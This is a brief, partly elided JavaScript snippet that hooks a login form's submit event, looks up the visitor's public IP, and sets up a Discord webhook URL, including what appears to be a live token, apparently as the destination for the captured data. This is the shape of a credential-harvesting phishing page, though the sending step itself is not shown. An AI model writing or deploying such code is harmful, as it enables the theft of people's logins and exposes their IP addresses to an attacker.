...
document.getElementById('loginForm').addEventListener('submit', function(event) {
    ...
    fetch('https://api.ipify.org?format=json')
        ...
        .then(data => {
            ...
            const webhookUrl = 'https://discord.com/api/webhooks/1306602285065044039/bwf9VxbT9R54njEJzaFU9KlPiOydsL-6_XsLHzaK5vUusAwsSaNpE9w76rrxmSlPUjjW';  // Replace with your Discord webhook
